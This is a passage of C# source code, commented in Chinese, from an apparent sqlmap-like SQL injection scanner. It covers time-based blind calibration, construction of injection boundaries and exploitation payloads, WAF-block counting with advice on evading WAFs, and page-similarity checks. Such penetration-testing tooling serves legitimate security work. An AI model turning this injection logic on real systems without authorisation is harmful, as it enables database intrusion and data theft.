                return ctx.BaseSec;
            }
            List<long> samples = ctx.SerialTimeSamples.Count >= 3
                ? new List<long>(ctx.SerialTimeSamples)
                : ctx.SerialTimeSamples.Concat(ctx.ConcurrentTimeSamples).ToList();
            //兜底：样本不足3个（如前奏请求全部失败）才补发原始请求，最多补5次防死目标死循环
            string prevPhase = ctx.Phase;
            for (int i = 0; samples.Count < 3 && i < 5; i++)
            {
                ctx.Config.CheckStop();
                ctx.Phase = "基线";
                HttpResponse resp = await HTTPTool.SendRequestRetryAsync(new HttpRequest(ctx.Config, ctx.BaseReq.HeaderAndBody)).ConfigureAwait(false);
                CountPhase(ctx);
                if (resp.StatusCode > 0 && resp.RunTime > 0)
                {
                    samples.Add(resp.RunTime);
                    ctx.SerialTimeSamples.Add(resp.RunTime);
                }
            }
            ctx.Phase = prevPhase;
            if (samples.Count == 0)
            {
                //目标完全不可达：保持旧行为的下限语义（基线0，时间类检测自行按超时/确认轮兜底）
                samples.Add(0);
            }
            int max = (int)samples.Max();
            int min = (int)samples.Where(s => s > 0).DefaultIfEmpty(max).Min();
            ctx.BaseJitterMs = max - min;
            ctx.BaseSec = (int)Math.Ceiling(max / 1000.0);
            string src = ctx.SerialTimeSamples.Count >= 3 ? "前奏串行样本" : "前奏样本+补测";
            Log.Show("基线响应时间约" + max + "毫秒（抖动" + ctx.BaseJitterMs + "毫秒，样本" + samples.Count + "个取自" + src + "），时间类检测延时设置为" + Math.Max(1, ctx.BaseSec + 1) + "秒！");
            if (ctx.BaseSec >= 2)
            {
                Log.Warning("目标基线响应较慢（>" + ctx.BaseSec + "秒），时间盲注判定误差增大，建议调大超时或使用布尔/Union通道！");
            }
            if (ctx.BaseJitterMs > 1000)
            {
                Log.Warning("目标响应时间抖动较大（" + ctx.BaseJitterMs + "毫秒），时间类检测将追加一轮确认防误报！");
            }
            return ctx.BaseSec;
        }

        /// <summary>重查询（CPU消耗型延时）payload特征标记：这类payload的[SLEEPTIME]是放大倍数，单位耗时远小于1秒</summary>
        private static readonly string[] HeavyQueryMarkers = { "RANDOMBLOB(", "BENCHMARK(", "GENERATE_SERIES(", "REGEXP_SUBSTRING(", "REPEAT(", "RECURSIVE" };

        /// <summary>识别payload是否属于重查询类型，返回其特征标记（用作校准缓存key）</summary>
        private static string? GetHeavyQueryKey(string? payload)
        {
            if (string.IsNullOrEmpty(payload))
            {
                return null;
            }
            foreach (string m in HeavyQueryMarkers)
            {
                if (payload.Contains(m, StringComparison.OrdinalIgnoreCase))
                {
                    return m;
                }
            }
            return null;
        }

        /// <summary>
        /// 重查询payload单位延时校准：以[SLEEPTIME]=1实测目标实际耗时（扣除基线网络耗时），结果缓存到ctx。
        /// 返回单位毫秒；&lt;=0表示校准失败（调用方按不缩放处理，保持原有行为）
        /// </summary>
        private static async Task<double> CalibrateHeavyUnitMs(Ctx ctx, PayloadTest test, PayloadBoundary boundary, int where, string heavyKey)
        {
            if (ctx.HeavyUnitMs.TryGetValue(heavyKey, out double cached))
            {
                return cached;
            }
            double unitMs = -1;
            try
            {
                PayloadPlaceholder cph = new PayloadPlaceholder(1);
                string cprefix = Rep(ctx, cph, boundary.Prefix);
                string csuffix = Rep(ctx, cph, boundary.Suffix);
                string cpayload = Rep(ctx, cph, test.RequestPayload) + Rep(ctx, cph, test.RequestComment);
                string creqTxt = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, cpayload), cprefix, csuffix));
                HttpResponse resp = await Send(ctx, creqTxt, cpayload).ConfigureAwait(false);
                unitMs = resp.RunTime - ctx.BaseSec * 1000.0;
                //只要单位耗时>50ms就启用缩放（不再设950ms上限）：单位耗时接近/超过1秒时不缩放会产生欠延时漏报
                if (unitMs > 50)
                {
                    Log.Show("重查询payload（" + heavyKey.TrimEnd('(') + "）单位延时实测约" + (int)unitMs + "毫秒，[SLEEPTIME]将等比放大以达成目标延时！");
                }
            }
            catch { /* 校准失败按不缩放处理 */ }
            ctx.HeavyUnitMs[heavyKey] = unitMs;
            return unitMs;
        }

        /// <summary>
        /// 清理页面：剔除动态区域 + 剔除payload回显（原文及URL编码形态）
        /// </summary>
        private static string Clear(Ctx ctx, string? page, string payload)
        {
            string txt = WebPageDiffAnalyzer.ClearDynamicText(ctx.Features, page ?? "");
            return InjectTools.StripPayloadReflection(txt, payload);
        }

        /// <summary>
        /// 反射剔除（真实输出占位保护）：先把报错正则的真实命中段替换为哨兵串，
        /// 再做payload反射剔除，最后还原哨兵——防止payload反射剔除的模糊通配把真实DB输出一并吃掉。
        /// 哨兵用\u0001包裹不含字母数字的串，避免被模糊路径的字母数字分段匹配吞掉。
        /// </summary>
        private static string StripWithProtect(string body, string payload, Regex regex)
        {
            Match m = regex.Match(body ?? "");
            if (!m.Success)
            {
                return InjectTools.StripPayloadReflection(body ?? "", payload);
            }
            string sentinel = "" + Guid.NewGuid().ToString("N") + "";
            string masked = body!.Substring(0, m.Index) + sentinel + body.Substring(m.Index + m.Length);
            string stripped = InjectTools.StripPayloadReflection(masked, payload);
            return stripped.Replace(sentinel, m.Value, StringComparison.Ordinal);
        }

        /// <summary>
        /// 检测阶段标记：原值+&lt;Encode&gt;前缀+$sql$+后缀&lt;/Encode&gt;（发送时$sql$替换为解析后的payload）。
        /// 前后缀必须放在Encode块内：boundary前后缀可能含空格（如' WHERE 5454=5454、 AND (5454=5454），
        /// 放在块外会原样进入请求行导致URL非法。
        /// 同时按forgePayload规则在前缀后补空格：payload无前导空格（如AND [RANDNUM]=[RANDNUM]），
        /// 前缀为空或以引号/括号结尾时需要补一个空格才能拼出合法SQL。
        /// 编码策略不在标记期分叉：统一Encode块，发送期按块位置（请求行/urlencoded体=编码，头/JSON/XML/multipart体=原文）推断。
        /// </summary>
        private static string MarkedValue(Ctx ctx, string pvalue, string prefix, string suffix)
        {
            string marked = (pvalue ?? "") + ConstData.StartPoint + FixPrefix(prefix) + ConstData.InjectStr + suffix + ConstData.EndPoint;
            //base64包装参数：剥离Encode标签把基底值并入块内重套普通Encode块（发送期由base64encode工具编码回写）
            return ctx.Base64 ? WrapBase64MarkedValue(marked) : marked;
        }

        /// <summary>
        /// 启发式探针/checkDynParam用的探针标记值：原值+&lt;Encode&gt;$sql$&lt;/Encode&gt;
        /// </summary>
        private static string? ProbeMarkedValue(Ctx ctx)
        {
            string marked = ctx.PValue + ConstData.GetParamAndEncode("");
            return ctx.Base64 ? WrapBase64MarkedValue(marked) : marked;
        }

        /// <summary>
        /// base64包装参数的标记值整体打包：剥离成对Encode标签，把基底值（原参数解码值）并入块体，
        /// 重新套普通&lt;Encode&gt;块——标记形态与非base64参数完全一致，
        /// base64编码回写由启用的base64encode编码工具在发送管线链尾完成（AutoTamper机制随注入记录持久化/恢复）。
        /// </summary>
        public static string WrapBase64MarkedValue(string markedValue)
        {
            string inner = (markedValue ?? "")
                .Replace(ConstData.StartPoint, "", StringComparison.Ordinal)
                .Replace(ConstData.EndPoint, "", StringComparison.Ordinal);
            return ConstData.StartPoint + inner + ConstData.EndPoint;
        }

        /// <summary>
        /// base64包装参数识别（--base64同款启发式）：长度4~4096、纯base64字符集、解码成功、
        /// UTF-8可解码且无可疑控制字符、去padding再编码与原文一致（排除恰好符合字符集的普通字符串）。
        /// 识别失败静默返回false，按普通参数流程检测。
        /// </summary>
        private static bool TryDecodeBase64Param(string? value, out string decoded)
        {
            decoded = "";
            //最短4字符（base64("1")="MQ=="）：过短值由往返一致性+可打印校验兜底排除误识别
            if (string.IsNullOrEmpty(value) || value.Length < 4 || value.Length > 4096)
            {
                return false;
            }
            if (!Regex.IsMatch(value, @"^[A-Za-z0-9+/]+={0,2}$"))
            {
                return false;
            }
            try
            {
                byte[] bytes = Convert.FromBase64String(value);
                string txt = Encoding.UTF8.GetString(bytes);
                //UTF-8解码出现替换字符=大概率不是文本参数；控制字符（\t\r\n除外）同理
                if (txt.Contains('�') || txt.Any(c => char.IsControl(c) && c != '\t' && c != '\r' && c != '\n'))
                {
                    return false;
                }
                //往返一致性：去padding重编码必须还原（"test1234"这类偶合串会被此条排除）
                string trimmed = value.TrimEnd('=');
                if (!Convert.ToBase64String(bytes).TrimEnd('=').Equals(trimmed, StringComparison.Ordinal))
                {
                    return false;
                }
                decoded = txt;
                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// 前缀规整：前缀不以空格/(结尾时补一个空格（forgePayload 同款规则）。
        /// 检测发送与回显剔除必须使用同一份规整结果，保证反射串能被完整剔除。
        /// </summary>
        private static string FixPrefix(string prefix)
        {
            string prefixFixed = prefix ?? "";
            if (!prefixFixed.EndsWith(' ') && !prefixFixed.EndsWith('('))
            {
                prefixFixed += " ";
            }
            return prefixFixed;
        }

        /// <summary>
        /// 页面中回显的完整注入串=规整前缀+payload+后缀（参数原值保留用于与模板对齐，不能剔除）。
        /// 只剔payload会把boundary前后缀（如" AND (5454=5454"、"-- xxxxx"）留在页面里，把真值页ratio压到阈值以下。
        /// </summary>
        private static string ReflectionValue(string prefix, string payload, string suffix)
        {
            return FixPrefix(prefix) + (payload ?? "") + (suffix ?? "");
        }

        /// <summary>
        /// 从页面模板词表中挑选盲注判断关键字：必须在真值原文出现、假值原文不出现（反向则相反）。
        /// 直接在原始响应上验证，可排除被payload回显（href里的注入串）污染的候选词；
        /// 长词、含字母的词优先，避免选中纯数字短词被后续取数payload的回显干扰。
        /// </summary>
        private static string? FindBlindKey(string template, string? trueBody, string? falseBody, out bool revers)
        {
            revers = false;
            //falseBody为空（无记录空页）是合法场景：空串不含任何词，首个循环自然命中"真值有、假值无"的词，不应提前放弃
            if (string.IsNullOrEmpty(template) || string.IsNullOrEmpty(trueBody))
            {
                return "";
            }
            falseBody ??= "";
            List<string> words = Regex.Split(template, @"[^-￿\w\d]+")
                .Where(w => w.Length > 0)
                .Distinct()
                .OrderByDescending(w => w.Length)
                .ThenByDescending(w => w.Any(char.IsLetter))
                .ToList();
            foreach (string w in words)
            {
                if (trueBody.Contains(w, StringComparison.Ordinal) && !falseBody.Contains(w, StringComparison.Ordinal))
                {
                    return w;
                }
            }
            foreach (string w in words)
            {
                if (!trueBody.Contains(w, StringComparison.Ordinal) && falseBody.Contains(w, StringComparison.Ordinal))
                {
                    revers = true;
                    return w;
                }
            }
            return "";
        }

        /// <summary>
        /// 利用阶段标记：统一使用 and 胶水与后续取数payload衔接（取数payload如"1=2 union all select ..."不带前导关键字），
        /// 按数据库追加注释收尾；无注释时将boundary后缀保留在编码段内保证括号配平。
        /// 前缀同样在Encode块内（可能含空格，见MarkedValue说明）。
        /// where=3（参数整体替换）或报错技术（errorTechnique=true）时按用例语义改用检出用例的vector模板：
        /// prefixQuery/suffixQuery对WHERE.REPLACE均跳过boundary前后缀，取数条件/数据表达式直接进vector的[INFERENCE]/[QUERY]槽位，
        /// 仅按库追加注释；报错技术where=1/2同样原文复用vector（baseValue+prefix+vector+注释+suffix），
        /// 保证取数触发函数/包装结构与检测命中payload完全一致（sqlmap vector存档复用同款）。
        /// </summary>
        private static string ExploitMarkedValue(Ctx ctx, string pvalue, string prefix, string suffix, DBType db,
            int where = 1, string vectorTemplate = "", PayloadPlaceholder? ph = null, bool errorTechnique = false,
            string? exploitRawStart = null, string? exploitRawStop = null)
        {
            string? bakedVector = null;
            if ((where == 3 || errorTechnique) && !string.IsNullOrWhiteSpace(vectorTemplate))
            {
                string? baked = BakeVector(ctx, ph, vectorTemplate, db, exploitRawStart, exploitRawStop);
                if (!string.IsNullOrEmpty(baked))
                {
                    bakedVector = baked;
                }
            }
            //where!=3且vector无取数槽位时走and胶水路径（bakedVector=null）；
            //报错技术where=1/2的vector保留boundary前后缀（keepGlueAffixes）
            string marked = BakeExploitMarkedValue(pvalue, prefix, suffix, db, bakedVector, where != 3);
            return ctx.Base64 ? WrapBase64MarkedValue(marked) : marked;
        }

        /// <summary>
        /// 利用标记烘焙（与检测期ExploitMarkedValue同一语义，供恢复注入记录时按结构化字段重烘焙）：
        /// 基底值 + Encode块（前缀+and $sql$+注释+后缀，或已渲染vector+注释）。
        /// keepGlueAffixes：报错技术where=1/2的vector复用场景置真——vector替换的是"and $sql$"段，
        /// boundary前后缀仍需保留（检测期装配为 baseValue+prefix+vector+注释+suffix）；
        /// where=3参数替换语义保持跳过前后缀（sqlmap prefixQuery/suffixQuery对WHERE.REPLACE同款）。
        /// 编码策略统一Encode块，发送期按块位置推断是否URL编码（见StringReplace.IsRawPosition）。
        /// </summary>
        public static string BakeExploitMarkedValue(string baseValue, string prefix, string suffix, DBType db, string? bakedVectorOrNull, bool keepGlueAffixes = false)
        {
            string comment = db switch
            {
                DBType.MySQL => "#",
                DBType.Access => "",
                DBType.UnKnow => "",
                _ => "-- "
            };
            string inner;
            if (bakedVectorOrNull != null)
            {
                string tail = string.IsNullOrEmpty(comment) ? (suffix ?? "") : (comment + (suffix ?? ""));
                //keepGlueAffixes（报错where=1/2）：前缀走FixPrefix规整（不以空格/(结尾补空格），
                //与检测期MarkedValue装配完全一致，避免 baseValue+vector 粘连（如 id=1AND ...）
                inner = keepGlueAffixes
                    ? FixPrefix(prefix) + bakedVectorOrNull + tail
                    : bakedVectorOrNull + comment;
            }
            else
            {
                string tail = string.IsNullOrEmpty(comment) ? (suffix ?? "") : (comment + (suffix ?? ""));
                inner = (prefix ?? "") + " and " + ConstData.InjectStr + tail;
            }
            return (baseValue ?? "") + ConstData.StartPoint + inner + ConstData.EndPoint;
        }

        /// <summary>
        /// 恢复期vector烘焙（无检测上下文）：[INFERENCE]/[QUERY]替换为$sql$，其余占位符用全新随机占位符渲染，
        /// [ORIGVALUE]用记录的原参数值。模板无取数槽位时返回null（调用方回退and胶水路径）。
        /// </summary>
        public static string? BakeVectorForRestore(string? vectorTemplate, string? origValue, DBType db = DBType.UnKnow)
        {
            string v = vectorTemplate ?? "";
            if (!HasVectorSlot(v))
            {
                return null;
            }
            bool isQuerySlot = v.Contains("[QUERY]", StringComparison.Ordinal);
            v = v.Replace("[INFERENCE]", ConstData.InjectStr, StringComparison.Ordinal).Replace("[QUERY]", ConstData.InjectStr, StringComparison.Ordinal);
            //分隔符按记录库型编码渲染（与检测期RepSql同语义），恢复取数时反射页同样无法伪造标记。
            //[QUERY]报错槽位：分隔符对齐为当前回显标记组合（EchoMarkers.Start+Split / Split+End），
            //取数时[QUERY]位塞裸表达式、解析走EchoMarkers正则——调用方须先EchoMarkers.Use(record)再调本方法
            if (isQuerySlot)
            {
                return new PayloadPlaceholder().ReplaceSql(v, DelimiterEncoderFor(db),
                    Payload.EchoMarkers.Start + Payload.EchoMarkers.Split,
                    Payload.EchoMarkers.Split + Payload.EchoMarkers.End)
                    .Replace("[ORIGVALUE]", origValue ?? "", StringComparison.Ordinal);
            }
            return new PayloadPlaceholder().ReplaceSql(v, DelimiterEncoderFor(db)).Replace("[ORIGVALUE]", origValue ?? "", StringComparison.Ordinal);
        }

        /// <summary>vector模板是否含取数槽位（[INFERENCE]条件槽/[QUERY]报错数据槽）</summary>
        private static bool HasVectorSlot(string vectorTemplate)
        {
            return !string.IsNullOrWhiteSpace(vectorTemplate)
                && (vectorTemplate.Contains("[INFERENCE]", StringComparison.Ordinal) || vectorTemplate.Contains("[QUERY]", StringComparison.Ordinal));
        }

        /// <summary>
        /// 烘焙where=3参数替换点的vector模板为利用标记：
        /// [INFERENCE]（布尔/时间条件槽）与[QUERY]（报错数据表达式槽）统一替换为发送期标记$sql$，
        /// 其余占位符（[RANDNUM]/[SLEEPTIME]/[DELIMITER_START]/[ORIGVALUE]等）按检测时同一上下文渲染。
        /// exploitRawStart/exploitRawStop非空时（报错vector复用）：分隔符对齐为取数回显标记组合，
        /// [QUERY]槽位取数塞裸表达式，消除vector分隔符+ConcatData双重标记开销。
        /// 模板无取数槽位时返回空串（调用方回退and胶水路径）。
        /// </summary>
        private static string? BakeVector(Ctx ctx, PayloadPlaceholder? ph, string? vectorTemplate, DBType db,
            string? exploitRawStart = null, string? exploitRawStop = null)
        {
            string v = vectorTemplate ?? "";
            if (!v.Contains("[INFERENCE]", StringComparison.Ordinal) && !v.Contains("[QUERY]", StringComparison.Ordinal))
            {
                return "";
            }
            v = v.Replace("[INFERENCE]", ConstData.InjectStr, StringComparison.Ordinal).Replace("[QUERY]", ConstData.InjectStr, StringComparison.Ordinal);
            PayloadPlaceholder placeholder = ph ?? new PayloadPlaceholder();
            if (exploitRawStart != null)
            {
                return placeholder.ReplaceSql(v, DelimiterEncoderFor(db), exploitRawStart, exploitRawStop)
                    .Replace("[ORIGVALUE]", ctx.PValue ?? "", StringComparison.Ordinal);
            }
            return RepSql(ctx, placeholder, v, db);
        }

        /// <summary>
        /// 按注入位置把标记值写回请求文本：Query/BodyForm重组参数；Cookie/Header改头；BodyJson改JSON体
        /// </summary>
        private static string BuildRequest(Ctx ctx, string? markedValue)
        {
            switch (ctx.Place)
            {
                case ParamPlace.Uri:
                    return RequestRewriter.SetInjectUriSegment(ctx.BaseReq.HeaderAndBody, ctx.UriIndex, markedValue);
                case ParamPlace.Cookie:
                    return RequestRewriter.SetInjectCookie(ctx.BaseReq.HeaderAndBody, ctx.PName, markedValue);
                case ParamPlace.Header:
                    return RequestRewriter.SetInjectHeader(ctx.BaseReq.HeaderAndBody, ctx.HeaderName, markedValue);
                case ParamPlace.BodyJson:
                    return RequestRewriter.SetInjectJsonBody(ctx.BaseReq.HeaderAndBody, ctx.PName, markedValue);
                case ParamPlace.BodyXml:
                    return RequestRewriter.SetInjectXmlBody(ctx.BaseReq.HeaderAndBody, ctx.PName, markedValue);
                case ParamPlace.BodyMultipart:
                    return RequestRewriter.SetInjectMultipart(ctx.BaseReq.HeaderAndBody, ctx.PName, markedValue);
                default:
                    return RequestRewriter.SetInjectToRequest(ctx.BaseReq.HeaderAndBody, RequestRewriter.SetInject(ctx.BaseReq.Params, ctx.PName, markedValue));
            }
        }

        /// <summary>WAF拦截停止阈值：DetectStopOnWaf开关开启时，单参数检测累计被拦截此次数即中断整个检测</summary>
        private const int WafStopThreshold = 5;

        /// <summary>发包画像埋点：按当前Phase计数（并发波下多请求并发进入，加锁保护）</summary>
        private static void CountPhase(Ctx ctx)
        {
            string p = string.IsNullOrEmpty(ctx.Phase) ? "其他" : ctx.Phase;
            lock (ctx.PhaseSent)
            {
                ctx.PhaseSent[p] = ctx.PhaseSent.TryGetValue(p, out int n) ? n + 1 : 1;
            }
        }

        private static async Task<HttpResponse> Send(Ctx ctx, string requestTxt, string payload)
        {
            HttpRequest hr = new HttpRequest(ctx.Config, requestTxt);
            hr.Payload = payload;
            HttpResponse resp = await HTTPTool.SendRequestRetryAsync(hr).ConfigureAwait(false);
            CountPhase(ctx);
            //WAF拦截统计：401未授权/403禁止/406不接受/429限流/501不支持 均视为疑似拦截（并发波下Interlocked计数）
            Interlocked.Increment(ref ctx.WafSent);
            if (DetectTuning.WafBlockCodes.Contains(resp.StatusCode))
            {
                Interlocked.Increment(ref ctx.WafBlocked);
                if (ctx.Config.DataConfig.DetectStopOnWaf && ctx.WafBlocked >= WafStopThreshold)
                {
                    if (Interlocked.Exchange(ref ctx.WafStopLogged, 1) == 0)
                    {
                        Log.Warning("WAF拦截已达" + WafStopThreshold + "次（HTTP 401/403/406/429/501），按开关设置停止注入检测！建议配置随机UA/随机源IP/代理/请求延时（网络设置-基础配置）/tamper（防护绕过-脚本库）后重测。");
                    }
                    throw new OperationCanceledException("WAF拦截达阈值，按开关设置停止检测！");
                }
            }
            return resp;
        }

        /// <summary>
        /// 跨参数信号共享：有会话时把共享命中boundary排到枚举最前（优先非限定，未命中自然回退全量）
        /// </summary>
        private static IEnumerable<PayloadBoundary> OrderBoundaries(DetectSessionState? session, IEnumerable<PayloadBoundary> boundaries)
        {
            return session != null ? session.OrderBoundaries(boundaries) : boundaries;
        }

        /// <summary>
        /// boundary矩阵过滤：level/ptype/clause 三项匹配（where在主循环按单值逐一匹配；
        /// clause中[0]为通配符，双方都非[0]时才要求交集）
        /// </summary>
        private static IEnumerable<PayloadBoundary> MatchBoundaries(PayloadTest test, int level, int[] ptypes)
        {
            bool testClauseAny = test.Clause.Count == 1 && test.Clause[0] == 0;
            foreach (PayloadBoundary b in InjectPayloadLoader.GetBoundaries().Where(b => b.Level <= level).OrderBy(b => b.Level))
            {
                //无前缀无后缀的通用边界（sqlmap ptype不做排除过滤同款）：不含引号/括号包裹语义，对字符串/数字参数同样有效；
                ///不参与ptype两轮过滤——否则内联查询（用例全为where=3，仅匹配此边界）对字符串参数永远拿不到边界，形同虚设
                bool universal = string.IsNullOrEmpty(b.Prefix) && string.IsNullOrEmpty(b.Suffix);
                if (!universal && !ptypes.Contains(b.Ptype))
                {
                    continue;
                }
                bool boundClauseAny = b.Clause.Count == 1 && b.Clause[0] == 0;
                if (!testClauseAny && !boundClauseAny && !test.Clause.Intersect(b.Clause).Any())
                {
                    continue;
                }
                yield return b;
            }
        }

        /// <summary>
        /// payload归一化（sqlmap seenPayload的stripPayload同款）：字母串(≥4)与数字串替换为占位，
        /// 形状相同的请求视为重复（随机占位符/随机数差异不影响去重判定）
        /// </summary>
        public static string NormalizePayloadKey(string s)
        {
            return Regex.Replace(s ?? "", "[A-Za-z]{4,}|\\d+", ".");
        }

        /// <summary>
        /// casting检测（sqlmap heuristicCheckSqlInjection同款）：数字参数两探针——
        /// 算术探针（orig+r-r 数学等于原值，页面一致=参数交给SQL求值，疑似可注入）；
        /// 浮点探针（orig.randStr 页面仍一致=小数/后缀被丢弃，参数被intval/floatval强转，注入可能性极低）。
        /// 预检失败不阻塞检测。
        /// </summary>
        private static async Task CheckCasting(Ctx ctx)
        {
            try
            {
                if (!long.TryParse(ctx.PValue, out long origInt))
                {
                    return;
                }
                string reqTxt = BuildRequest(ctx, MarkedValue(ctx, "", "", ""));
                Random rand = new Random();
                long r = rand.Next(100, 999);
                //算术探针：orig+r-r 数学上等于orig，服务端若交给SQL求值，页面应与原页一致
                string arith = (origInt + r) + "-" + r;
                //浮点探针：orig.randX 若页面仍与原页一致，说明小数及后缀被丢弃（强制类型转换）
                string cast = ctx.PValue + "." + rand.Next(1, 9) + MyTools.RandStr(4).ToLower();
                //并发波B：双探针同波并发（旧逻辑算术命中即不发浮点省1包；并发换前奏延迟，判定顺序不变）
                var resB = await RunPreWave(ctx, new List<(string, string, string)>
                {
                    ("cast", reqTxt, arith), ("cast", reqTxt, cast)
                }).ConfigureAwait(false);
                HttpResponse arithResp = resB[0].resp;
                string arithTxt = InjectTools.StripPayloadReflection(WebPageDiffAnalyzer.ClearDynamicText(ctx.Features, arithResp.BodyTxt ?? ""), arith);
                if (RatioVsTemplate(ctx, arithTxt) >= DetectTuning.UpperBound)
                {
                    Log.Show("casting探针：参数" + ctx.PName + "的值参与算术求值（" + arith + "页面与原页一致），疑似可注入！");
                    return;
                }
                HttpResponse castResp = resB[1].resp;
                string castTxt = InjectTools.StripPayloadReflection(WebPageDiffAnalyzer.ClearDynamicText(ctx.Features, castResp.BodyTxt ?? ""), cast);
                if (RatioVsTemplate(ctx, castTxt) >= DetectTuning.UpperBound)
                {
                    Log.Warning("casting检测：参数" + ctx.PName + "疑似被后端强制类型转换（如intval/floatval，" + cast + "页面与原页一致），注入可能性极低，建议跳过此参数节省检测时间！");
                }
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch
            {
                //casting预检失败不阻塞检测
            }
        }

        /// <summary>
        /// JSON最小化（sqlmap jsonMinimize同款）：解析后按键名排序、去空白重建，
        /// 使键序/空白差异不影响相似度比对；非JSON返回null
        /// </summary>
        public static string? JsonMinimize(string? text)
        {
            if (string.IsNullOrWhiteSpace(text))
            {
                return null;
            }
            string t = text.Trim();
            if (!((t.StartsWith('{') && t.EndsWith('}')) || (t.StartsWith('[') && t.EndsWith(']'))))
            {
                return null;
            }
            try
            {
                using System.Text.Json.JsonDocument doc = System.Text.Json.JsonDocument.Parse(t);
                StringBuilder sb = new StringBuilder(t.Length);
                WriteJsonMin(doc.RootElement, sb);
                return sb.ToString();
            }
            catch
            {
                return null;
            }
        }

        private static void WriteJsonMin(System.Text.Json.JsonElement el, StringBuilder sb)
        {
            switch (el.ValueKind)
            {
                case System.Text.Json.JsonValueKind.Object:
                    sb.Append('{');
                    foreach (System.Text.Json.JsonProperty p in el.EnumerateObject().OrderBy(p => p.Name, StringComparer.Ordinal))
                    {
                        AppendJsonString(sb, p.Name);
                        sb.Append(':');
                        WriteJsonMin(p.Value, sb);
                        sb.Append(',');
                    }
                    if (sb.Length > 0 && sb[^1] == ',')
                    {
                        sb.Length--;
                    }
                    sb.Append('}');
                    break;
                case System.Text.Json.JsonValueKind.Array:
                    sb.Append('[');
                    foreach (System.Text.Json.JsonElement item in el.EnumerateArray())
                    {
                        WriteJsonMin(item, sb);
                        sb.Append(',');
                    }
                    if (sb.Length > 0 && sb[^1] == ',')
                    {
                        sb.Length--;
                    }
                    sb.Append(']');
                    break;
                default:
                    sb.Append(el.GetRawText());
                    break;
            }
        }

        /// <summary>JSON字符串字面量转义输出（NativeAOT安全，替代反射版JsonSerializer.Serialize&lt;string&gt;）</summary>
        private static void AppendJsonString(StringBuilder sb, string s)
        {
            sb.Append('"');
            foreach (char c in s)
            {
                switch (c)
                {
                    case '"': sb.Append("\\\""); break;
                    case '\\': sb.Append("\\\\"); break;
                    case '\b': sb.Append("\\b"); break;
                    case '\f': sb.Append("\\f"); break;
                    case '\n': sb.Append("\\n"); break;
                    case '\r': sb.Append("\\r"); break;
                    case '\t': sb.Append("\\t"); break;
                    default:
                        if (c < ' ')
                        {
                            sb.Append("\\u").Append(((int)c).ToString("x4"));
                        }
                        else
                        {
                            sb.Append(c);
                        }
                        break;
                }
            }
            sb.Append('"');
        }

        /// <summary>
        /// 与模板的相似度（带缓存+JSON结构感知）：模板为JSON且页面可解析为JSON时按最小化形态比对（键序/空白无关），
        /// 否则按纯文本比对；结果按页面文本缓存，真假值重发产生的相同页面直接命中缓存
        /// </summary>
        private static double RatioVsTemplate(Ctx ctx, string txt)
        {
            txt ??= "";
            if (ctx.RatioCache.TryGetValue(txt, out double cached))
            {
                return cached;
            }
            double r;
            string? pageJson = ctx.TemplateJson != null ? JsonMinimize(txt) : null;
            if (ctx.TemplateJson != null && pageJson != null)
            {
                r = PageLikeTool.CalculateSimilarity(ctx.TemplateJson, pageJson);
            }
            else if (ctx.TemplateSkeleton != null)
            {
                //结构骨架比对：页面无标签=结构尽失，按0处理（sqlmap：空骨架集合比对同语义）
                string? skeleton = WebPageDiffAnalyzer.ExtractStructuralTokens(txt);
                r = skeleton == null ? 0.0 : PageLikeTool.CalculateSimilarity(ctx.TemplateSkeleton, skeleton);
            }
            else if (ctx.TemplateTextOnly != null)
            {
                r = PageLikeTool.CalculateSimilarity(ctx.TemplateTextOnly, WebPageDiffAnalyzer.GetFilteredPageContent(txt));
            }
            else
            {
                r = PageLikeTool.CalculateSimilarity(ctx.Template, txt);
            }
            if (ctx.RatioCache.Count < 512)
            {
                ctx.RatioCache[txt] = r;
            }
            return r;
        }

        /// <summary>
        /// 按test.where语义计算注入前的参数基底值（agent.payload 语义）：
        /// 1=ORIGINAL保留原值；2=NEGATIVE换成负随机数（让原查询无结果）；3=REPLACE整体替换
        /// </summary>
        private static string BaseValue(Ctx ctx, int where, string payload)
        {
            switch (where)
            {
                case 3:
                    return "";
                case 2:
                    return (payload ?? "").StartsWith('-') ? "" : "-" + new Random().Next(1000, 99999);
                default:
                    return ctx.PValue ?? "";
            }
        }

        /// <summary>
        /// 占位符替换 + [ORIGVALUE]（原参数值，Parameter replace类用例使用）
        /// </summary>
        private static string Rep(Ctx ctx, PayloadPlaceholder ph, string? template)
        {
            return ph.Replace(template).Replace("[ORIGVALUE]", ctx.PValue ?? "", StringComparison.Ordinal);
        }

        /// <summary>
        /// SQL上下文占位符渲染（报错检测payload/vector）：分隔符按库编码（hex/chr由服务端解码出原始随机串），
        /// grep只匹配原始串——页面反射的payload只含编码形态，物理上不可能被误判为DB报错输出。
        /// </summary>
        private static string RepSql(Ctx ctx, PayloadPlaceholder ph, string? template, DBType db)
        {
            return ph.ReplaceSql(template, DelimiterEncoderFor(db)).Replace("[ORIGVALUE]", ctx.PValue ?? "", StringComparison.Ordinal);
        }

        /// <summary>
        /// 分隔符编码器选择（与取数方言DialectFactory.MarkerEncoder同源）：
        /// 未知库/Informix回退Quote（引号原文无转换，保持旧行为）；ClickHouse方言本身即Quote
        /// </summary>
        private static Payload.LiteralEncoder DelimiterEncoderFor(DBType db)
        {
            if (db == DBType.UnKnow || db == DBType.Informix)
            {
                return Payload.LiteralEncoder.Quote;
            }
            return Payload.DialectFactory.OptionsFor(db).MarkerEncoder;
        }

        /// <summary>
        /// extendTests匹配（sqlmap checks.py:197-204/340/414同款）：用例为dbms专属且命中已识别库候选（含国产库兼容映射）时，
        /// 该用例及其boundary不受level/risk上限裁剪；通用用例（dbms为空）与dbmsExclude不触发扩展
        /// </summary>
        private static bool ExtendMatch(PayloadTest test, List<DBType> candidates)
        {
            if (candidates.Count == 0)
            {
                return false;
            }
            DBType target = DbmsNameToDbType(test.Dbms);
            return target != DBType.UnKnow && candidates.Any(c => c == target || CompatDb(c) == target);
        }

        /// <summary>
        /// DBMS指纹过滤：命中指纹后，dbms专属用例必须匹配指纹库（含国产库兼容映射）；通用用例（dbms为空）始终执行
        /// </summary>
        private static bool DbmsMatch(PayloadTest test, List<DBType> candidates)
        {
            DBType exclude = DbmsNameToDbType(test.DbmsExclude);
            if (exclude != DBType.UnKnow && candidates.Any(c => c == exclude || CompatDb(c) == exclude))
            {
                return false;
            }
            DBType target = DbmsNameToDbType(test.Dbms);
            if (candidates.Count > 0 && target != DBType.UnKnow)
            {
                return candidates.Any(c => c == target || CompatDb(c) == target);
            }
            return true;
        }

